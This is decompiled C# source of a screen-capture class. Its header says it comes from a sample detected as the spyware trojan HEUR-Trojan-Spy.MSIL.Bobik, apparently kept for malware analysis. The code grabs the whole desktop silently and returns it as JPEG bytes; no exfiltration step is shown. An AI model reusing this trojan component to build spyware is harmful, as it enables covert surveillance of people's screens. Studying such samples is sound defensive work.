// Decompiled with JetBrains decompiler
// Type: setup.ScreenShot
// Assembly: setup, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 95C225EB-6E6B-4374-8E73-8564F911E43A
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Spy.MSIL.Bobik.gen-c7f353c4ca722da712da454317e9d00b77c9b6cf6194b47009dbd67517cf2abc.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace setup
{
  internal class ScreenShot
  {
    private const int WaitScreenTry = 3;
    private const int WaitScreenShotPause = 1000;

    [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int memcmp(IntPtr b1, IntPtr b2, int count);

    [DllImport("gdi32.dll")]
    private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

    public static Rectangle GetDisplayBounds()
    {
      using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
      {
        IntPtr hdc = graphics.GetHdc();
        return new Rectangle(0, 0, ScreenShot.GetDeviceCaps(hdc, 118), ScreenShot.GetDeviceCaps(hdc, 117));
      }
    }

    public static byte[] MakeDesktopScreenshot() => ScreenShot.MakeScreenshot(ScreenShot.GetDisplayBounds());

    public static byte[] MakeScreenshot(Rectangle Bounds)
    {
      using (Bitmap B1 = new Bitmap(Bounds.Width, Bounds.Height))
      {
        using (Bitmap bitmap = new Bitmap(Bounds.Width, Bounds.Height))
        {
          for (int index = 0; index < 3; ++index)
          {
            using (Graphics Graph1 = Graphics.FromImage((Image) B1))
            {
              using (Graphics Graph2 = Graphics.FromImage((Image) bitmap))
              {
                ScreenShot.CopyScreen(Graph1, Bounds.Size);
                ScreenShot.CopyScreen(Graph2, Bounds.Size);
                if (ScreenShot.CompareImages(B1, bitmap))
                  break;
              }
            }
          }
          return ScreenShot.ImageToBytes(bitmap);
        }
      }
    }

    private static byte[] ImageToBytes(Bitmap Img)
    {
      MemoryStream memoryStream = new MemoryStream();
      Img.Save((Stream) memoryStream, ImageFormat.Jpeg);
      return memoryStream.ToArray();
    }

    private static BitmapData LockBits(Bitmap Im) => Im.LockBits(new Rectangle(new Point(0, 0), Im.Size), ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);

    private static bool CompareImages(Bitmap B1, Bitmap B2)
    {
      if (B1 == null != (B2 == null) || B1.Size != B2.Size)
        return false;
      BitmapData bitmapdata1 = ScreenShot.LockBits(B1);
      BitmapData bitmapdata2 = ScreenShot.LockBits(B2);
      try
      {
        IntPtr scan0_1 = bitmapdata1.Scan0;
        IntPtr scan0_2 = bitmapdata2.Scan0;
        int num = bitmapdata1.Stride * B1.Height;
        IntPtr b2 = scan0_2;
        int count = num;
        return ScreenShot.memcmp(scan0_1, b2, count) == 0;
      }
      finally
      {
        B1.UnlockBits(bitmapdata1);
        B2.UnlockBits(bitmapdata2);
      }
    }

    private static void CopyScreen(Graphics Graph, Size RegionSize)
    {
      Thread.Sleep(1000);
      Graph.CopyFromScreen(Point.Empty, Point.Empty, RegionSize);
    }
  }
}
